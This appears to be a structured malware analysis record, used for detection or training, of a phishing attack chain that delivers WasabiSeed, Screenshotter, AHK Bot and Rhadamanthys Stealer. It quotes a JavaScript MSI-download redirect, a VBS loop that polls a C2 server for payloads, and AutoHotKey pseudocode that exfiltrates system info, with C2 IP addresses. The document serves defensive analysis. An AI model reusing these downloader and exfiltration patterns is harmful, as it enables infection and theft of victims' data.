package_info.package_name: WasabiSeed, Screenshotter, AHK Bot, Rhadamanthys Stealer
package_info.package_manager: Custom-delivered via phishing/MSI installers (not public package manager)
package_info.package_versions: N/A (custom malware, delivered as MSI/VBS/AutoHotKey scripts)
package_info.why_malicious: These packages are part of a coordinated attack chain designed to gain initial access, perform reconnaissance, and exfiltrate sensitive data from victim systems. They include downloaders, screenshot utilities, automation bots, and infostealers, all of which perform unauthorized actions such as downloading further payloads, capturing screenshots, automating malicious tasks, and stealing credentials and files.

execution_context.trigger: runtime (user opens malicious attachment or link)
execution_context.file_location: JavaScript file (Document_24_jan-3559116.js) delivered via phishing email

malicious_snippets.code_snippet: window.location.href = 'hxxp://79.137.198.60/1/ke.msi'; // or similar code to download and execute MSI
malicious_snippets.code_behavior: At runtime, the code redirects the user to a remote URL to download a malicious MSI installer, enabling the delivery of the WasabiSeed payload.

malice_analysis.why_suspicious: Redirecting users to download and execute remote MSI installers is a common initial infection vector for malware.
malice_analysis.violated_expectations: Normal JavaScript in documents should not trigger downloads of executables from untrusted sources.
malice_analysis.similar_legitimate_use: Software updaters may download installers, but only from trusted, signed sources.
key_indicators: Remote download of MSI from suspicious IP

malicious_snippets.code_snippet:
Set objInstaller = CreateObject("WindowsInstaller.Installer")
Do
  objInstaller.InstallProduct "hxxp://109.107.173.72/%serial%", ""
  WScript.Sleep 60000
Loop
malicious_snippets.code_behavior: At runtime, the VBS repeatedly uses Windows Installer to connect to a C2 server and attempts to download and execute additional MSI payloads, enabling further malware delivery.

malice_analysis.why_suspicious: Continuous polling of a remote C2 for new payloads is a hallmark of downloader malware.
malice_analysis.violated_expectations: Legitimate installers do not repeatedly contact remote servers for arbitrary payloads.
malice_analysis.similar_legitimate_use: Enterprise software updaters may check for updates, but not in this persistent, uncontrolled manner.

malicious_snippets.code_behavior: At runtime, the code captures a JPG screenshot of the user's desktop and submits it to a remote C2 server via HTTP POST, enabling reconnaissance and data exfiltration.

malice_analysis.why_suspicious: Taking screenshots and exfiltrating them to a remote server is a classic reconnaissance technique.
malice_analysis.violated_expectations: Legitimate software should not capture and transmit desktop images without user consent.
malice_analysis.similar_legitimate_use: Remote support tools may capture screenshots, but with explicit user approval.

execution_context.trigger: runtime (after reconnaissance, if target is interesting)

malicious_snippets.code_snippet:
; Pseudocode (AutoHotKey)
C2 := "hxxp://89.208.105.255/" . serial
Loop {
  data := CollectSystemInfo()
  HttpPost(C2, data)
  Sleep, 60000
}
malicious_snippets.code_behavior: At runtime, the script collects system information and sends it to a hardcoded C2 server, using the C: drive serial in the URL path, enabling profiling and further targeted actions.

malice_analysis.why_suspicious: Automated system profiling and exfiltration to a C2 is a common step in targeted attacks.
malice_analysis.violated_expectations: Legitimate automation scripts do not exfiltrate system data to unknown servers.
malice_analysis.similar_legitimate_use: Enterprise inventory tools may collect system info, but not exfiltrate it to untrusted domains.
key_indicators: Use of drive serial as unique identifier

execution_context.trigger: runtime (after AHK Bot, if target is valuable)
execution_context.file_location: Rhadamanthys Stealer (delivered via AHK Bot or separate payload)

malicious_snippets.code_behavior: At runtime, the stealer extracts credentials, cookies, and files from browsers, crypto wallets, chat clients, FTP clients, and VPNs, then exfiltrates this data to a remote C2 server.

malice_analysis.why_suspicious: Bulk credential and file theft is a primary goal of infostealer malware.
malice_analysis.violated_expectations: Legitimate software should not access or transmit sensitive user data from unrelated applications.
malice_analysis.similar_legitimate_use: Password managers may access credentials, but only with user consent and never exfiltrate them.

attack_chain.action: User receives phishing email with malicious attachment or link.
attack_chain.leads_to: Initial infection via download and execution of WasabiSeed MSI.

attack_chain.action: WasabiSeed VBS downloader repeatedly contacts C2 to fetch additional payloads.
attack_chain.leads_to: Download and execution of Screenshotter and AHK Bot.

attack_chain.action: Screenshotter captures and exfiltrates desktop screenshots to C2 for reconnaissance.
attack_chain.leads_to: Attacker reviews screenshots to determine if target is valuable.

attack_chain.action: If target is interesting, AHK Bot is deployed to automate further profiling and C2 communication.
attack_chain.leads_to: System profiling and preparation for further exploitation.

attack_chain.action: If target is high-value, Rhadamanthys Stealer is deployed to extract and exfiltrate credentials, files, and sensitive data.

behavioral_signatures: Repeated download attempts of MSI installers from untrusted IPs/domains
VBS or AutoHotKey scripts that loop and contact remote C2 servers
Automated screenshot capture and exfiltration via HTTP POST
Credential and file access from unrelated applications followed by network exfiltration
file_indicators: AutoHotKey scripts (au3.ahk) and executables (au3.exe) in temp or user directories
Suspicious MSI installers (ke.msi, Screenshotter Installer MSI, AHK Bot installer MSI)
Presence of screenshot files or temporary images in user directories
network_indicators: HTTP POST requests to /screenshot/%serial% or similar C2 paths
Frequent outbound connections to hardcoded IPs/domains not associated with legitimate software
detection_knowledge.how_to_detect: Monitor for execution of MSI installers from untrusted sources, especially those that drop VBS or AutoHotKey scripts. Detect repeated outbound connections to known C2 IPs/domains and HTTP POST requests containing screenshots or credential data. Flag processes that access browser, wallet, or chat client data and immediately initiate network exfiltration. Look for the presence of suspicious scripts or binaries in user or temp directories, and correlate with phishing email delivery.
